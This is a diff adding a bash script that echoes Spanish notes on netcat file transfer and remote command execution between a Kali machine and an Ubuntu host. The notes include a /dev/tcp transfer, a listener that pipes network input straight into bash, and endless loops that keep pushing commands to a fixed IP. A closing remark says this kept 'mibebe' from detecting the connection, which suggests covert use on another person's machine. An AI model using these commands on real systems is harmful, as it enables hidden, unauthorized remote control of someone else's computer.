@@ -1,0 +1,56 @@
+#!/bin/bash
+
+echo '''
+
+#Enviar archivos con nc usando tcp
+en la maquina kali
+nc -nlvp 1234 < archivo
+
+#en la maquina que recibe archivo
+cat > archivo < /dev/tcp/$ip_kali/1234 
+
+#verificar con md5sum
+
+
+
+# nc
+
+
+utilizando nc para enviar comandos archivos:
+
+en la kali:
+#esto envia lo que tenga adentro ese archivo a la terminal para ejecutarse
+cat adios| nc -q 1 100.65.128.115 1234
+
+ejemplo
+nano adios
+minet
+
+
+para ejecutar minet en la otra maquina ubuntu:
+ nc -l -p 1234 | bash
+
+
+
+#entonces para hacer un loop y enviar el mensaje se hace:
+
+
+#enviando el mensaje en la maquina kali a ubuntu
+while true; do
+cat adios| nc -q 1 100.65.128.115 1234
+sleep 3
+done
+
+
+
+
+#en la maquina ubunto para ejecutar:
+ while true; do
+ nc -l -p 1234 | bash
+
+sleep 1
+done
+
+y asi no detecto mibebe la conexion
+
+'''
